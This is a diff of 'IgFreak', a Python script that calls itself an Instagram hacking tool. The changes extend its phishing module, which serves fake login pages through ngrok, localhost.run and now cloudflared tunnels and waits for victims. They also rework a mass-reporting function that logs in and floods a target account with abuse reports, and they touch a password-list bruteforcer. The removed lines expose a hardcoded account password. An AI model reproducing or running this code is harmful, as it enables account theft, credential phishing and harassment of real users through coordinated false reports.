@@ -1,4 +1,3 @@
-
 #!/usr/bin/python3
 # -*- coding: UTF-8 -*-
 #
@@ -84,7 +83,15 @@ def check_d():
             os.system("apt install openssh ")
             os.system("apt-get install ssh ")
             return check_d()
-
+    php3 = os.system("command -v  cloudflared > /dev/null")
+    if php3 == 0:
+        pass
+    else:
+        print(f"{R}[!] cloudflared - 404 NOT FOUND !")
+        php_install = input(f"{B}\n[?] What to Install It Now ? (y/n) : {W}")
+        if php_install.lower() == "y":
+            install_cloudflared()
+            return check_d()
 code = """
 torser="tor"
 if pgrep -x "$torser" > /dev/null
@@ -111,7 +118,58 @@ if tors == "not":
 else:
 	status = "Running"
 import pip
+col = {"BL" : '\033[30m',"B" : '\033[94m',"C" : '\033[96m',"D" : '\033[36m',"G" : '\033[92m',"P" : '\033[95m',"R" : '\033[91m',"Y": '\033[93m',"W" : '\033[37m',"BLACK_BG" : '\033[40m',"RED_BG" : '\033[41m',"GREEN_BG" : '\033[42m',"YELLOW_BG" : '\033[43m',"BLUE_BG" : '\033[44m',"PURPLE_BG" : '\033[45m',"CYAN_BG" : '\033[46m',"WHITE_BG" : '\033[47m',"BOLD" : '\033[1m',"FAINT" : '\033[2m',"ITALIC" : '\033[3m',"UNDERLINE" : '\033[4m',"BLINK" : '\033[5m',"INVERSE" : '\033[7m',"HIDDEN": '\033[8m',"STRIKE" : '\033[9m',"END" : '\033[0m'}
 
+def success(string):
+    print(f"{col['R']}[{col['G']}  ✓  {col['R']}] {col['G']}{string}")
+
+def initilise():
+    os.system("touch .igfreak.conf > /dev/null 2>&1")
+
+    conf =open(os.getcwd()+"/.igfreak.conf",'w')
+    conf.writelines("""
+igfreak_report_account = 'Igfreak_reporter' 
+igfreak_report_account_pass = 'pass' """)
+    conf.close()
+
+def install_cloudflared():
+    arch = os.uname()[4]
+    if "arm" in arch or "Android" in arch:
+        os.system(f"wget https://github.com/cloudflare/cloudflared/releases/download/2022.2.0/cloudflared-linux-arm --no-check-certificate && mv cloudflared-linux-arm {sys.prefix}/bin/cloudflared && chmod +x {sys.prefix}/bin/cloudflared ")
+    elif "aarch64" in arch:
+        os.system(f"wget https://github.com/cloudflare/cloudflared/releases/download/2022.2.0/cloudflared-linux-arm64 --no-check-certificate && mv cloudflared-linux-arm64 {sys.prefix}/bin/cloudflared && chmod +x {sys.prefix}/bin/cloudflared ")
+    elif "x86_64" in arch:
+        os.system(f"wget https://github.com/cloudflare/cloudflared/releases/download/2022.2.0/cloudflared-linux-amd64 --no-check-certificate && mv cloudflared-linux-amd64 {sys.prefix}/bin/cloudflared && chmod +x {sys.prefix}/bin/cloudflared ")
+    else:
+        os.system( f"wget https://github.com/cloudflare/cloudflared/releases/download/2022.2.0/cloudflared-linux-386 --no-check-certificate && mv cloudflared-linux-386 {sys.prefix}/bin/cloudflared && chmod +x {sys.prefix}/bin/cloudflared ")
+    
+try:
+    exec(subprocess.check_output("cat .igfreak.conf",shell=True).decode()) 
+    igfreak_report_account = igfreak_report_account
+    igfreak_report_account_pass = igfreak_report_account_pass
+
+except Exception as e:
+    pass
+
+def read_cred():
+    if os.path.isfile(".igfreak.conf"):
+        try:
+            ohh = igfreak_report_account
+        except Exception as e:
+            error('Invaild syntax in conf file')
+        if igfreak_report_account is None:
+            error("Invaild account in conf file")
+        else:
+            account = igfreak_report_account
+        if igfreak_report_account_pass is None:
+            
+            error("Invaild password in conf file")
+        else:
+            password = igfreak_report_account_pass
+
+        return {"account":account,"password":password}
+    else:
+        error("You should initlize the tool by --initlize")
 pipv = pip.__version__
 logo = f"""
 [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;4;4;8m [0m[38;2;26;36;72m.[0m[38;2;41;56;112m.[0m[38;2;52;66;137m'[0m[38;2;57;69;147m'[0m[38;2;58;67;147m'[0m[38;2;60;65;147m'[0m[38;2;64;65;151m'[0m[38;2;71;65;156m,[0m[38;2;73;64;156m,[0m[38;2;76;62;156m,[0m[38;2;78;60;156m,[0m[38;2;81;58;156m,[0m[38;2;83;57;156m,[0m[38;2;85;55;156m,[0m[38;2;88;54;156m,[0m[38;2;90;52;156m,[0m[38;2;92;51;156m,[0m[38;2;95;50;156m'[0m[38;2;97;49;155m'[0m[38;2;99;47;155m'[0m[38;2;102;46;155m'[0m[38;2;104;45;154m'[0m[38;2;100;42;147m'[0m[38;2;101;41;145m'[0m[38;2;104;40;144m'[0m[38;2;99;36;134m'[0m[38;2;84;30;112m.[0m[38;2;58;20;74m.[0m[38;2;10;3;12m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m[38;2;0;0;0m [0m
@@ -143,8 +201,9 @@ OPTIONS              USAGE                              REQUIRED
 
 --bruteforce;-b       BruteForce Instagram Account         -pl(passlist),-u(username)
 --phish;-ph           PHish any Instagram Account          -t(template)
---report;-r           Send 50 Reports to any IG Account    -u(usename)
+--report;-r           Send 50 Reports to any IG Account    -u(usename),-id(reason report),-am(amount of reports )
 --update              Update tool to latest version
+--initlize            Initlize Reporter account         
 {G}For more information visit {B}https://github.com/T-Dynamos/IgFreak
 """
 
@@ -209,12 +268,17 @@ version = 4.0
 rs = requests.session()
 
 def report(id,xx,amount,wait):
-	printInfo("Reporter")
-	print(f"{G}\nUsing Account :{C} https://instagram.com/igfreak_reporter")
-	
+    printInfo("Reporter")
+    a = read_cred()
+    try:
+        username = a["account"]
+        password = a["password"] 
+    except Exception as e :
+        return error("Unexcepted error "+e)
+    print(f"{G}\nUsing Account :{C} https://instagram.com/{username}")
 
-	url = 'https://www.instagram.com/accounts/login/ajax/'
-	headers = {
+    url = 'https://www.instagram.com/accounts/login/ajax/'
+    headers = {
      'accept': '*/*',
     'accept-encoding': 'gzip, deflate, br',
     'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
@@ -232,62 +296,54 @@ def report(id,xx,amount,wait):
     'x-ig-www-claim': '0',
     'x-instagram-ajax': 'bc3d5af829ea',
     'x-requested-with': 'XMLHttpRequest'}
-	import base64
-	username = "igfreak_reporter"
-	password = base64.b64decode(b'YW5zaDEyMzQ=')
-    
-	data = {
+    data = {
          'username': f'{username}',
-         'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{str(password.decode())}',
+         'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
          'queryParams': '{}',
-         'optIntoOneTap': 'false'}    
-	r = rs.post(url, headers=headers, data=data)
-	if  'authenticated":true' in r.text or 'userId' in r.text:
-		rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
-		pass
-	else:
-		error("Login Failed")
-		error(r.text)
-		return sys.exit(0)
+         'optIntoOneTap': 'false'}
+    r = rs.post(url, headers=headers, data=data)
+    if  'authenticated":true' in r.text or 'userId' in r.text:
+        rs.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
+        pass
+    else:
+        error("Login Failed")
+        error(r.text)
+        return sys.exit(0)
+    if xx == 1:
+        fid="1"
+    if xx == 2:
+        fid="5"
 
-
-
-	if xx == 1:
-		fid="1"
-	if xx == 2:
-		fid="5"
-	if xx == 3:
-		fid="8"
-	if xx == 4:
-		fid="8"
-	if xx == 5:
-		fid="7"
-	if xx == 6:
-		fid="2"
-	if xx == 7:
-		fid="6"
-	else:
-		fid="1"
-	n=0
-	nu=0
-	u = rs.get(f"https://www.instagram.com/{id}/?__a=1")
-	i1d =  str(u.json()["graphql"]["user"]["id"])
-	print(G+"\nTarget : "+f"{id} : {C} {i1d}\n")
-	for i_1 in range(1,amount):
-		url_1=f'https://www.instagram.com/users/{i1d}/report/'
-		data_1={'source_name':'',
-		'reason_id':f'1',
-		'frx_context':''}
-		report_1=rs.post(url_1,data=data_1)
-		if '"status":"ok"' in report_1.text:
-			nu += 1
-		else:
-			n += 1
-		sys.stdout.write(G+f"\r{W}[{R+str(i_1)}{W}]{G} Sent = {C}{nu}  {Y}Error = {R} {n}")
-		sys.stdout.flush()
-		import time
-		time.sleep(wait)
-	print(G+"\n\n Done . Sent Successfull !")    		
+    if xx == 3:
+        fid="8"
+    if xx == 4:
+        fid="8"
+    if xx == 5:
+        fid="7"
+    if xx == 6:
+        fid="2"
+    if xx == 7:
+        fid="6"
+    else:
+        fid="1"
+    n=0
+    nu=0
+    u = rs.get(f"https://www.instagram.com/{id}/?__a=1")
+    i1d =  str(u.json()["graphql"]["user"]["id"])
+    print(G+"\nTarget : "+f"{id} : {C} {i1d}\n")
+    for i_1 in range(1,amount):
+        url_1=f'https://www.instagram.com/users/{i1d}/report/'
+        data_1={'source_name':'','reason_id':f'1','frx_context':''}
+        report_1=rs.post(url_1,data=data_1)
+        if '"status":"ok"' in report_1.text:
+            nu += 1
+        else:
+            n += 1
+        sys.stdout.write(G+f"\r{W}[{R+str(i_1)}{W}]{G} Sent = {C}{nu}  {Y}Error = {R} {n}")
+        sys.stdout.flush()
+        import time
+        time.sleep(wait)
+    print(G+"\n\n Done . Sent Successfull !")    		
 	
 	
 import argparse 
@@ -352,86 +408,114 @@ cli_parser.add_argument('--update',  # parse path to password list file
                         
                         help=help
                         )
-
+cli_parser.add_argument('--initlize', 
+                        action='store_true',
+                        
+                        help=help
+                        )
 pwd = os.getcwd()
 
 def phish(template):
-	printInfo("Phisher ")
-	os.system('pkill php')
-	print()
-	import random
-	port = random.randint(1111,9999)
-	print(f"""
+    printInfo("Phisher ")
+    os.system('pkill php')
+    print()
+    import random
+    port = random.randint(1111,9999)
+    print(f"""
 
-	{C} Template : {G} {template}
-	{C} Server   : {G} Ngrok
+    {C} Template : {G} {template}
+    {C} Server   : {G} Ngrok ,Localhost.run , CloudFlared
         {C} Port     : {G} {port}
-	
-	{B}       STARTING SERVERS
+    
+    {B}       STARTING SERVERS
 {G}{"="*25}{Y}  LOGS  {G}{"="*25}{R}""")
-	a = startServicea(template+"/",port)
-	link = a["link"]
-	link2 = a["link2"]
-	if link=="":
-		print(f'{G}{"="*25}{Y}LOGS END{G}{"="*25}{R}')
-		print(f"{R}NGROK LINK DEPLOY FAILED")
-		pass
-	else:
-		print(f'{G}{"="*25}{Y}LOGS END{G}{"="*25}{R}')
-		print(f"\n{G} NGROK LINK = {Y} {link}")
-		print(f"{G} LINK STATUS CODE = {W}[{G}{requests.get(link).status_code}{W}] ")
-		print(f"{G} SHORT LINK = {Y} {short(link)}\n")
-	print(f"\n{B} LOCALHOST.RUN LINK = {Y} {link2}")
-	print(f"{B} LINK STATUS CODE = {W}[{G}{requests.get(link2).status_code}{W}] ")
-	print(f"{B} SHORT LINK = {Y} {short(link2)}")
-	print()
-	print(f"{B}[{G}>{B}]{W} Wating for victims ...[ {G} Press Ctrl + C to exit {W} ]")
-	def check(file):
-		if os.path.exists(file):
-			return True
-		else:
-			return False
-	def ok():
-		while True:
-			a = check("ip.txt")
-			if a==True:
-				os.system('cat ip.txt')
-				os.remove('ip.txt')
-				continue
-			else:
-				continue		
-	try:
-		ok()
+    a = startServicea(template+"/",port)
+    link = a["link"]
+    link2 = a["link2"]
+    link3 = a["link3"]
+    if link=="":
+        print(f'{G}{"="*25}{Y}LOGS END{G}{"="*25}{R}')
+        print(f"{R}NGROK LINK DEPLOY FAILED")
+        pass
+    else:
+        print(f'{G}{"="*25}{Y}LOGS END{G}{"="*25}{R}')
+        print(f"\n{G} NGROK LINK = {Y} {link}")
+        print(f"{G} LINK STATUS CODE = {W}[{G}{requests.get(link).status_code}{W}] ")
+        print(f"{G} SHORT LINK = {Y} {short(link)}\n")
+    if link2=="":
+        print(f"\n{R}LOCALHOST.RUN LINK DEPLOY FAILED")
+    else:
+        print(f"\n{B} LOCALHOST.RUN LINK = {Y} {link2}")
+        print(f"{B} LINK STATUS CODE = {W}[{G}{requests.get(link2).status_code}{W}] ")
+        print(f"{B} SHORT LINK = {Y} {short(link2)}")
+        print()
+    if link3=="":
+        print(f"\n{R}CLOUDFLARED LINK DEPLOY FAILED")
+    else:
+        print(f"\n{C} CLOUDFLARED LINK = {Y} {link3}")
+        print(f"{C} LINK STATUS CODE = {W}[{G}{requests.get(link2).status_code}{W}] ")
+        print(f"{C} SHORT LINK = {Y} {short(link3)}")
+        print()
+    print(f"{B}[{G}>{B}]{W} Wating for victims ...[ {G} Press Ctrl + C to exit {W} ]")
+    def check(file):
+        if os.path.exists(file):
+            return True
+        else:
+            return False
+    def ok():
+        while True:
+            a = check("ip.txt")
+            if a==True:
+                os.system('cat ip.txt')
+                os.remove('ip.txt')
+                continue
+            else:
+                continue        
+    try:
+        ok()
 
-	except Exception as e:
-		os.system("pkill php")
-		print(f"\n{R} Exiting , Error : {G} {str(e)}")
-		
+    except Exception as e:
+        os.system("pkill php")
+        print(f"\n{R} Exiting , Error : {G} {str(e)}")
+        
 
-	exit()
+    exit()
+
 
 def startServicea(folder,port):
-	import os
-	os.chdir(folder)
-	os.system("rm pass.txt ip.txt gmail.txt > /dev/null 2&>1")
-	
+    import os
+    os.chdir(folder)
+    os.system("rm pass.txt ip.txt gmail.txt > /dev/null 2&>1")
+    
 
-	code = f"""php -S 127.0.0.1:{port}> /dev/null 2>&1 &"""
-	fileok = os.system(code)
-	import time
-	time.sleep(3)
-	try:
-		link =  ngrok.connect(port,'http')
-		ngrok.get_ngrok_process().stop_monitor_thread()
-		link = str(link).replace('NgrokTunnel: "','')
-		link = link[:-28]
-	except Exception as e:
-		link = ""
-		pass
-	command = f"""echo 'ssh -R 80:localhost:{port} nokey@localhost.run > ok.txt' > tmp.sh && sh -c 'sh tmp.sh > /dev/null 2>&1  &' && rm tmp.sh && sleep 10 && cat ok.txt | grep -o "https://[0-9A-Za-z.-]*\.lhr.life" && rm ok.txt"""
-	oo = subprocess.check_output(command,shell=True)
-	link2 = (str(oo.decode())[:-1])
-	return {"link" : link ,"link2" : link2}
+    code = f"""php -S 127.0.0.1:{port}> /dev/null 2>&1 &"""
+    fileok = os.system(code)
+    import time
+    time.sleep(3)
+    try:
+        link =  ngrok.connect(port,'http')
+        ngrok.get_ngrok_process().stop_monitor_thread()
+        link = str(link).replace('NgrokTunnel: "','')
+        link = link[:-28]
+    except Exception as e:
+        link = ""
+        pass
+    command = f"""echo 'ssh -R 80:localhost:{port} nokey@localhost.run > ok.txt' > tmp.sh && sh -c 'sh tmp.sh > /dev/null 2>&1  &' && rm tmp.sh && sleep 10 && cat ok.txt | grep -o "https://[0-9A-Za-z.-]*\.lhr.life" && rm ok.txt"""
+    try:
+        oo = subprocess.check_output(command,shell=True)
+        link2 = (str(oo.decode())[:-1])
+    except Exception as e:
+        link2 = ""
+
+    command2 = f"""rm ~/cld.log > /dev/null 2>&1 &&  cloudflared tunnel -url http://localhost:{port} --logfile ~/cld.log > /dev/null 2>&1 &  
+    sleep 10 && grep -o "https://[-0-9a-z]*\.trycloudflare.com" ~/cld.log"""
+    try:
+        
+        link3 = str(os.popen(command2).read()[:-1])
+    except Exception as e:
+            link3 = str(e)
+            
+    return {"link" : link ,"link2" : link2,"link3":link3}
 
 def printInfo(str):
 	print(f"{Fore.MAGENTA}IgFreak , Slick Instagram Hacking command line tool. Copyright (C) 2021, T-Dynamos Ansh Dadwal\n .")
@@ -449,7 +533,10 @@ Parsed = cli_parser.parse_args()
 
 def ExecuteIgFreak():
     Parsed = cli_parser.parse_args()
-    
+    if Parsed.initlize == True:
+        initilise()
+        success("Initlized Success ready to edit .igfreak.conf")
+        sys.exit()
     if Parsed.update == True:
     	print("Updating...")
     	sys.exit(0)
@@ -650,9 +737,9 @@ def Bruteforce(passlist,username):
 
 	with open(passlist, 'rb') as file:
 	           for line in file:
-	               for word in line.split():
+	               for n,word in enumerate(line.split()):
 	                   		print("\n")
-	                   		print(f"{Y}[{W}+{Y}]{C} Testing password : {G}"+word.decode())  
+	                   		print(f"{Y}[{W}n/{str(n_words)}{Y}]{C} Testing password : {G}"+word.decode())  
 	                   		trial = signin(word.decode(),username)
 	                   		if trial == True:
 	                   			end = timer()
